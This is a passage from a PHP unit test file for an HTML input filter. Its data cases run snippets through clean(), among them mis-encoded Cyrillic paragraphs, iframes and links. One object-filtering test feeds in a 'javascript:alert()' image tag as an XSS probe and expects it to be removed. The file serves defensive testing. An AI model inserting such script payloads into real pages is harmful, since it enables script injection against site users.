<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'From generic cases',
			],
			'tracker15673e'       => [
				'raw',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'From generic cases',
			],
			'tracker15673f'       => [
				'raw',
				'<a rel="new" href="#"></a>',
				'<a rel="new" href="#"></a>',
				'From generic cases',
			],
			'tracker15673g'       => [
				'string',
				'<a rel="new" href="#"></a>',
				'<a rel="new" href="#"></a>',
				'From generic cases',
			],
			'tracker15673h'       => [
				'raw',
				'<hr id="system-readmore" />',
				'<hr id="system-readmore" />',
				'From generic cases',
			],
			'tracker15673i'       => [
				'string',
				'<hr id="system-readmore" />',
				'<hr id="system-readmore" />',
				'From generic cases',
			],
			'tracker15673j'       => [
				'string',
				'<p style="text-align: justify;"><strong>Nafta nebo baterie? Za nás jednoznačně to druhé. Před pár dny jsme si vyzvedli nový elektromobil. Nyní jej testujeme a zatím můžeme říct jedno - pozor, toto vozítko je vysoce návykové!</strong></p>',
				'<p style="text-align: justify;"><strong>Nafta nebo baterie? Za nás jednoznačně to druhé. Před pár dny jsme si vyzvedli nový elektromobil. Nyní jej testujeme a zatím můžeme říct jedno - pozor, toto vozítko je vysoce návykové!</strong></p>',
				'From generic cases',
			],
			'tracker15673k'       => [
				'string',
				'<p style="text-align: justify;"><a href="http://www.example.com" target="_blank" rel="noopener noreferrer">Auta.</a> </p>',
				'<p style="text-align: justify;"><a href="http://www.example.com" target="_blank" rel="noopener noreferrer">Auta.</a> </p>',
				'From generic cases',
			],
			'Attribute with dash' => [
				'string',
				'<img data-value="1" />',
				'<img data-value="1" />',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case with clean() using custom class blocked filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blockedClass
	 */
	public function testCleanWithClassAttributeBlocked($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter([], ['class'], 1, 1))->clean($data, $type),
			$message
		);
	}

	/**
	 * Test object filtering
	 */
	public function testCleanObject()
	{
		$rawInput   = '<img src="javascript:alert();" />';
		$cleanInput = '';

		$object   = new ArbitraryObject($rawInput, $rawInput, $rawInput);
		$expected = new ArbitraryObject($cleanInput, $rawInput, $rawInput);

		$filter = new InputFilter();

		$this->assertEquals($expected, $filter->clean($object));
	}
}
